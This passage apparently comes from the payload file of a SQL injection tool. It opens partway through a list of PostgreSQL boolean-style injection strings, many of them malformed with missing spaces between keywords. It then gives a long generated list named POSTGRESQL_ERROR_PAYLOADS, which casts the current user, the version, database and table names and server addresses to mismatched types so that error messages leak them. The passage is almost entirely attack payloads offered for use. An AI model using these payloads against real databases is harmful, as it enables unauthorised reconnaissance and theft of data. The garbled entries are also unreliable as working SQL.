1) AS TEXT)INCAST(1 AS TEXT)', 'AND CASE WHEN POWER(3,2)INLOG(10) THEN 1 ELSE 0 END', "OR LPAD('a',5,'0') IN (SELECT 1 UNION SELECT 2)", "AND STATEMENT_TIMESTAMP()>'postgres'", "|| (BIT_LENGTH('a')<CURRENT_DATABASE())", "OR 3.14159::TEXT!~~*RPAD('a',5,'0')::TEXT", 'AND CAST((1#1) AS TEXT)>CAST(CAST(1 AS CHAR) AS TEXT)', "OR 3.14159LIKE'a'", "AND REPEAT('a',3)::TEXT!=(SELECT COUNT(*) FROM pg_tables)", 'AND LENGTH(TYPEOF(1.5))ISLENGTH(CURRENT_SCHEMA())', 'AND ((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables)!=SESSION_USER)', '|| false<>EXTRACT(MONTH FROM NOW())', "AND RPAD('a',5,'0')::TEXT>=CURRENT_TIME", "AND (CURRENT_USERISLPAD('a',5,'0'))", '|| NOW() IN (SELECT 1 UNION SELECT 2)', 'OR CURRENT_TIMESTAMP() IN (SELECT 1 UNION SELECT 2)', '|| COUNT(DISTINCT 1) IS NOT NULL', 'AND FALSE IS NOT NULL', 'OR ARRAY_AGG(1) IS NOT NULL', "OR CASE WHEN ASCII('0')!=CEIL(3.9) THEN 1 ELSE 0 END", "AND CAST('1' AS NUMERIC)::TEXT!~~ROUND(3.5)::TEXT", "AND SQRT(16)::INTEGER~~*'test'", "|| SQRT(9)NOT INMD5('postgres')", '|| LENGTH((SELECT COUNT(*) FROM information_schema.tables))NOT ILIKELENGTH((SELECT SUM(1)))', "|| TO_DATE('2021-01-01','YYYY-MM-DD')::INTEGER>=ARRAY_AGG(2)", "OR LENGTH('a')::TEXTBETWEENPG_TYPEOF(1)::TEXT", '|| (EXP(0)NOT INCURRENT_TIME)', "AND (SELECT COUNT(*) FROM pg_indexes)::NUMERICBETWEEN'1'::INTEGER", 'OR 0.1 IN (SELECT 1 UNION SELECT 2)', "AND CASE WHEN trueILIKELPAD('a',5,'0') THEN 1 ELSE 0 END", "AND CASE WHEN '1'::INTEGERILIKE(1&1) THEN 1 ELSE 0 END", "OR CAST(SHA256('test') AS TEXT)ISCAST(SIGN(-5) AS TEXT)", "|| EXTRACT(HOUR FROM NOW())ILIKELTRIM('  a')", 'OR CAST(1 AS VARCHAR) IN (SELECT 1 UNION SELECT 2)', 'OR CASE WHEN SUBSTRING(\'mysql\' FROM 1)>=JSON_EXTRACT(\'{"a":1}\',\'$.a\') THEN 1 ELSE 0 END', "OR CEIL(3.1)::NUMERIC<>CAST('1' AS NUMERIC)", "AND (COUNT(1)<>UPPER('a'))", 'OR LOG10(1000)NOT IN(SELECT COUNT(*) FROM information_schema.tables)', '|| CHR(97) IS NOT NULL', 'OR (LOG10(100)BETWEENAVG(1))', "OR OCTET_LENGTH('test')INTYPEOF(1)", "AND LENGTH(MAX(1))NOT BETWEENLENGTH(SUBSTRING('mysql' FROM 1))", "|| MD5('postgres')!~~-1", 'OR CLOCK_TIMESTAMP()>=-1', "|| LENGTH(SUM(2))>=LENGTH(LPAD('a',5,'0'))", 'AND LENGTH(MOD(5,2))IS NOTLENGTH(FLOOR(100.1))', "OR CAST(MD5('test') AS TEXT)LIKECAST(MIN(1) AS TEXT)", 'AND (ARRAY_LOWER(ARRAY[1,2,3],1)=COUNT(1))', "AND CASE WHEN MD5('postgres')>=CAST(1 AS DECIMAL) THEN 1 ELSE 0 END", 'OR EXTRACT(MONTH FROM NOW())!~~MAX(1)', 'AND ((~1)<>0)', 'AND COUNT(1)::INTEGERNOT LIKECURRENT_USER', '|| POWER(2,3)::INTEGERNOT LIKECAST(1 AS BIGINT)', 'AND LENGTH(current_database()) IS NOT NULL', '|| COUNT(DISTINCT 1)::TEXTINCURRENT_DATABASE()::TEXT', '|| COUNT(1)::INTEGER!=ARRAY_AGG(1)', "OR CASE WHEN REPLACE('test','t','T')BETWEEN(SELECT COUNT(*) FROM information_schema.columns) THEN 1 ELSE 0 END", "AND 'admin' IN (SELECT 1 UNION SELECT 2)", 'AND (SELECT COUNT(*) FROM pg_proc) IN (SELECT 1 UNION SELECT 2)', '|| 2INCURRENT_TIMESTAMP()', "AND FLOOR(3.9)NOT INREPLACE('test','t','T')", 'AND CURRENT_TIMESTAMP()NOT INCURRENT_TIME', '|| NOW()::TEXT!=false', 'AND INET_SERVER_PORT() IN (SELECT 1 UNION SELECT 2)', 'AND CEIL(0.1)!=ARRAY_AGG(2)', "AND SUBSTR('abcdef',1,1) IS NOT NULL", "OR LENGTH(TYPEOF(1.5))LIKELENGTH(SHA256('test'))", 'AND 1::VARCHARILIKETYPEOF(1)', "AND CAST(CHAR_LENGTH('abc') AS TEXT)!=CAST(ARRAY_AGG(2) AS TEXT)", 'OR (1#1)::INTEGERIS NOTSUM(1)', 'AND LENGTH((SELECT 1))INLENGTH((2>>1))', 'OR LN(2.718)BETWEENNULL', "OR CLOCK_TIMESTAMP()::TEXT<=LOWER('A')::TEXT", 'AND VERSION()INCEIL(0.1)', "AND SQRT(144)::TEXT>=CHAR_LENGTH('abc')::TEXT", "|| CAST(REVERSE('abc') AS TEXT)LIKECAST((1|1) AS TEXT)", 'AND (SELECT MIN(1))::TEXTNOT BETWEENCURRENT_TIMESTAMP::TEXT', "OR (3&1)::NUMERICNOT ILIKETO_DATE('2021-01-01','YYYY-MM-DD')", 'AND 1 IS NOT NULL', 'AND (SELECT SUM(1))::NUMERICNOT INFALSE', 'AND CURRENT_TIMESTAMP~~(2>>1)', 'OR ROUND(3.5) IS NOT NULL', "OR LENGTH(LOWER('ADMIN'))NOT BETWEENLENGTH(PG_BACKEND_PID())", 'AND CASE WHEN JSONB_KEYS(\'{"a":1,"b":2}\')NOT ININITCAP(\'hello\') THEN 1 ELSE 0 END', 'AND (1#1)::TEXT=PG_TYPEOF(1)::TEXT', 'OR LENGTH(EXTRACT(DAY FROM NOW()))NOT BETWEENLENGTH(COUNT(*))', 'OR CAST(POWER(2,3) AS TEXT)<CAST(ARRAY_LENGTH(ARRAY[1,2,3],1) AS TEXT)', "AND STRING_AGG('test',';') IN (SELECT 1 UNION SELECT 2)", "OR (RPAD('a',5,'0')!=(SELECT COUNT(*) FROM information_schema.tables))"]
 
 POSTGRESQL_ERROR_PAYLOADS = ["CAST(current_user AS integer)::text", 'CAST(current_database() AS integer)::text', "CAST(user AS integer)::text", 'CAST(session_user AS integer)::text', "CAST(pg_backend_pid() AS integer)::text", 'CAST(version() AS integer)::text', "CAST(current_timestamp AS integer)::text", 'CAST(now() AS integer)::text', "CAST(pg_postmaster_start_time() AS integer)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS integer)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS integer)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS integer)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS integer)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS integer)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS integer)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS integer)::text', "CAST(inet_server_addr() AS integer)::text", 'CAST(inet_client_addr() AS integer)::text', "CAST(inet_server_port() AS integer)::text", 'CAST(inet_client_port() AS integer)::text', "CAST(current_setting(chr(100)) AS integer)::text", 'CAST(current_setting(chr(97)) AS integer)::text', "CAST(extract(epoch from now()) AS integer)::text", 'CAST(extract(year from now()) AS integer)::text', "CAST(extract(month from now()) AS integer)::text", 'CAST(extract(day from now()) AS integer)::text', "CAST((SELECT count(*) FROM pg_database) AS integer)::text", 'CAST((SELECT count(*) FROM pg_tables) AS integer)::text', "CAST((SELECT count(*) FROM pg_class) AS integer)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS integer)::text', "CAST(current_user AS bigint)::text", 'CAST(current_database() AS bigint)::text', "CAST(user AS bigint)::text", 'CAST(session_user AS bigint)::text', "CAST(pg_backend_pid() AS bigint)::text", 'CAST(version() AS bigint)::text', "CAST(current_timestamp AS bigint)::text", 'CAST(now() AS bigint)::text', "CAST(pg_postmaster_start_time() AS bigint)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS bigint)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS bigint)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS bigint)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS bigint)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS bigint)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS bigint)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS bigint)::text', "CAST(inet_server_addr() AS bigint)::text", 'CAST(inet_client_addr() AS bigint)::text', "CAST(inet_server_port() AS bigint)::text", 'CAST(inet_client_port() AS bigint)::text', "CAST(current_setting(chr(100)) AS bigint)::text", 'CAST(current_setting(chr(97)) AS bigint)::text', "CAST(extract(epoch from now()) AS bigint)::text", 'CAST(extract(year from now()) AS bigint)::text', "CAST(extract(month from now()) AS bigint)::text", 'CAST(extract(day from now()) AS bigint)::text', "CAST((SELECT count(*) FROM pg_database) AS bigint)::text", 'CAST((SELECT count(*) FROM pg_tables) AS bigint)::text', "CAST((SELECT count(*) FROM pg_class) AS bigint)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS bigint)::text', "CAST(current_user AS boolean)::text", 'CAST(current_database() AS boolean)::text', "CAST(user AS boolean)::text", 'CAST(session_user AS boolean)::text', "CAST(pg_backend_pid() AS boolean)::text", 'CAST(version() AS boolean)::text', "CAST(current_timestamp AS boolean)::text", 'CAST(now() AS boolean)::text', "CAST(pg_postmaster_start_time() AS boolean)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS boolean)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS boolean)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS boolean)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS boolean)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS boolean)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS boolean)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS boolean)::text', "CAST(inet_server_addr() AS boolean)::text", 'CAST(inet_client_addr() AS boolean)::text', "CAST(inet_server_port() AS boolean)::text", 'CAST(inet_client_port() AS boolean)::text', "CAST(current_setting(chr(100)) AS boolean)::text", 'CAST(current_setting(chr(97)) AS boolean)::text', "CAST(extract(epoch from now()) AS boolean)::text", 'CAST(extract(year from now()) AS boolean)::text', "CAST(extract(month from now()) AS boolean)::text", 'CAST(extract(day from now()) AS boolean)::text', "CAST((SELECT count(*) FROM pg_database) AS boolean)::text", 'CAST((SELECT count(*) FROM pg_tables) AS boolean)::text', "CAST((SELECT count(*) FROM pg_class) AS boolean)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS boolean)::text', "CAST(current_user AS timestamp)::text", 'CAST(current_database() AS timestamp)::text', "CAST(user AS timestamp)::text", 'CAST(session_user AS timestamp)::text', "CAST(pg_backend_pid() AS timestamp)::text", 'CAST(version() AS timestamp)::text', "CAST(current_timestamp AS timestamp)::text", 'CAST(now() AS timestamp)::text', "CAST(pg_postmaster_start_time() AS timestamp)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS timestamp)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS timestamp)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS timestamp)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS timestamp)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS timestamp)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS timestamp)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS timestamp)::text', "CAST(inet_server_addr() AS timestamp)::text", 'CAST(inet_client_addr() AS timestamp)::text', "CAST(inet_server_port() AS timestamp)::text", 'CAST(inet_client_port() AS timestamp)::text', "CAST(current_setting(chr(100)) AS timestamp)::text", 'CAST(current_setting(chr(97)) AS timestamp)::text', "CAST(extract(epoch from now()) AS timestamp)::text", 'CAST(extract(year from now()) AS timestamp)::text', "CAST(extract(month from now()) AS timestamp)::text", 'CAST(extract(day from now()) AS timestamp)::text', "CAST((SELECT count(*) FROM pg_database) AS timestamp)::text", 'CAST((SELECT count(*) FROM pg_tables) AS timestamp)::text', "CAST((SELECT count(*) FROM pg_class) AS timestamp)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS timestamp)::text', "CAST(current_user AS uuid)::text", 'CAST(current_database() AS uuid)::text', "CAST(user AS uuid)::text", 'CAST(session_user AS uuid)::text', "CAST(pg_backend_pid() AS uuid)::text", 'CAST(version() AS uuid)::text', "CAST(current_timestamp AS uuid)::text", 'CAST(now() AS uuid)::text', "CAST(pg_postmaster_start_time() AS uuid)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS uuid)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS uuid)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS uuid)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS uuid)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS uuid)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS uuid)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS uuid)::text', "CAST(inet_server_addr() AS uuid)::text", 'CAST(inet_client_addr() AS uuid)::text', "CAST(inet_server_port() AS uuid)::text", 'CAST(inet_client_port() AS uuid)::text', "CAST(current_setting(chr(100)) AS uuid)::text", 'CAST(current_setting(chr(97)) AS uuid)::text', "CAST(extract(epoch from now()) AS uuid)::text", 'CAST(extract(year from now()) AS uuid)::text', "CAST(extract(month from now()) AS uuid)::text", 'CAST(extract(day from now()) AS uuid)::text', "CAST((SELECT count(*) FROM pg_database) AS uuid)::text", 'CAST((SELECT count(*) FROM pg_tables) AS uuid)::text', "CAST((SELECT count(*) FROM pg_class) AS uuid)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS uuid)::text', "CAST(current_user AS inet)::text", 'CAST(current_database() AS inet)::text', "CAST(user AS inet)::text", 'CAST(session_user AS inet)::text', "CAST(pg_backend_pid() AS inet)::text", 'CAST(version() AS inet)::text', "CAST(current_timestamp AS inet)::text", 'CAST(now() AS inet)::text', "CAST(pg_postmaster_start_time() AS inet)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS inet)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS inet)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS inet)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS inet)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS inet)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS inet)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS inet)::text', "CAST(inet_server_addr() AS inet)::text", 'CAST(inet_client_addr() AS inet)::text', "CAST(inet_server_port() AS inet)::text", 'CAST(inet_client_port() AS inet)::text', "CAST(current_setting(chr(100)) AS inet)::text", 'CAST(current_setting(chr(97)) AS inet)::text', "CAST(extract(epoch from now()) AS inet)::text", 'CAST(extract(year from now()) AS inet)::text', "CAST(extract(month from now()) AS inet)::text", 'CAST(extract(day from now()) AS inet)::text', "CAST((SELECT count(*) FROM pg_database) AS inet)::text", 'CAST((SELECT count(*) FROM pg_tables) AS inet)::text', "CAST((SELECT count(*) FROM pg_class) AS inet)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS inet)::text', "CAST(current_user AS json)::text", 'CAST(current_database() AS json)::text', "CAST(user AS json)::text", 'CAST(session_user AS json)::text', "CAST(pg_backend_pid() AS json)::text", 'CAST(version() AS json)::text', "CAST(current_timestamp AS json)::text", 'CAST(now() AS json)::text', "CAST(pg_postmaster_start_time() AS json)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS json)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS json)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS json)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS json)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS json)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS json)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS json)::text', "CAST(inet_server_addr() AS json)::text", 'CAST(inet_client_addr() AS json)::text', "CAST(inet_server_port() AS json)::text", 'CAST(inet_client_port() AS json)::text', "CAST(current_setting(chr(100)) AS json)::text", 'CAST(current_setting(chr(97)) AS json)::text', "CAST(extract(epoch from now()) AS json)::text", 'CAST(extract(year from now()) AS json)::text', "CAST(extract(month from now()) AS json)::text", 'CAST(extract(day from now()) AS json)::text', "CAST((SELECT count(*) FROM pg_database) AS json)::text", 'CAST((SELECT count(*) FROM pg_tables) AS json)::text', "CAST((SELECT count(*) FROM pg_class) AS json)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS json)::text', "CAST(current_user AS jsonb)::text", 'CAST(current_database() AS jsonb)::text', "CAST(user AS jsonb)::text", 'CAST(session_user AS jsonb)::text', "CAST(pg_backend_pid() AS jsonb)::text", 'CAST(version() AS jsonb)::text', "CAST(current_timestamp AS jsonb)::text", 'CAST(now() AS jsonb)::text', "CAST(pg_postmaster_start_time() AS jsonb)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS jsonb)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS jsonb)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS jsonb)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS jsonb)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS jsonb)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS jsonb)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS jsonb)::text', "CAST(inet_server_addr() AS jsonb)::text", 'CAST(inet_client_addr() AS jsonb)::text', "CAST(inet_server_port() AS jsonb)::text", 'CAST(inet_client_port() AS jsonb)::text', "CAST(current_setting(chr(100)) AS jsonb)::text", 'CAST(current_setting(chr(97)) AS jsonb)::text', "CAST(extract(epoch from now()) AS jsonb)::text", 'CAST(extract(year from now()) AS jsonb)::text', "CAST(extract(month from now()) AS jsonb)::text", 'CAST(extract(day from now()) AS jsonb)::text', "CAST((SELECT count(*) FROM pg_database) AS jsonb)::text", 'CAST((SELECT count(*) FROM pg_tables) AS jsonb)::text', "CAST((SELECT count(*) FROM pg_class) AS jsonb)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS jsonb)::text', "CAST(current_user AS xml)::text", 'CAST(current_database() AS xml)::text', "CAST(user AS xml)::text", 'CAST(session_user AS xml)::text', "CAST(pg_backend_pid() AS xml)::text", 'CAST(version() AS xml)::text', "CAST(current_timestamp AS xml)::text", 'CAST(now() AS xml)::text', "CAST(pg_postmaster_start_time() AS xml)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS xml)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS xml)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS xml)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS xml)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS xml)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS xml)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS xml)::text', "CAST(inet_server_addr() AS xml)::text", 'CAST(inet_client_addr() AS xml)::text', "CAST(inet_server_port() AS xml)::text", 'CAST(inet_client_port() AS xml)::text', "CAST(current_setting(chr(100)) AS xml)::text", 'CAST(current_setting(chr(97)) AS xml)::text', "CAST(extract(epoch from now()) AS xml)::text", 'CAST(extract(year from now()) AS xml)::text', "CAST(extract(month from now()) AS xml)::text", 'CAST(extract(day from now()) AS xml)::text', "CAST((SELECT count(*) FROM pg_database) AS xml)::text", 'CAST((SELECT count(*) FROM pg_tables) AS xml)::text', "CAST((SELECT count(*) FROM pg_class) AS xml)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS xml)::text', "CAST(current_user AS bytea)::text", 'CAST(current_database() AS bytea)::text', "CAST(user AS bytea)::text", 'CAST(session_user AS bytea)::text', "CAST(pg_backend_pid() AS bytea)::text", 'CAST(version() AS bytea)::text', "CAST(current_timestamp AS bytea)::text", 'CAST(now() AS bytea)::text', "CAST(pg_postmaster_start_time() AS bytea)::text", 'CAST((SELECT datname FROM pg_database LIMIT 1) AS bytea)::text', "CAST((SELECT relname FROM pg_class LIMIT 1) AS bytea)::text", 'CAST((SELECT attname FROM pg_attribute LIMIT 1) AS bytea)::text', "CAST((SELECT proname FROM pg_proc LIMIT 1) AS bytea)::text", 'CAST((SELECT schemaname FROM pg_tables LIMIT 1) AS bytea)::text', "CAST((SELECT tablename FROM pg_tables LIMIT 1) AS bytea)::text", 'CAST((SELECT indexname FROM pg_indexes LIMIT 1) AS bytea)::text', "CAST(inet_server_addr() AS bytea)::text", 'CAST(inet_client_addr() AS bytea)::text', "CAST(inet_server_port() AS bytea)::text", 'CAST(inet_client_port() AS bytea)::text', "CAST(current_setting(chr(100)) AS bytea)::text", 'CAST(current_setting(chr(97)) AS bytea)::text', "CAST(extract(epoch from now()) AS bytea)::text", 'CAST(extract(year from now()) AS bytea)::text', "CAST(extract(month from now()) AS bytea)::text", 'CAST(extract(day from now()) AS bytea)::text', "CAST((SELECT count(*) FROM pg_database) AS bytea)::text", 'CAST((SELECT count(*) FROM pg_tables) AS bytea)::text', "CAST((SELECT count(*) FROM pg_class) AS bytea)::text", 'CAST((SELECT count(*) FROM pg_attribute) AS bytea)::text']
 
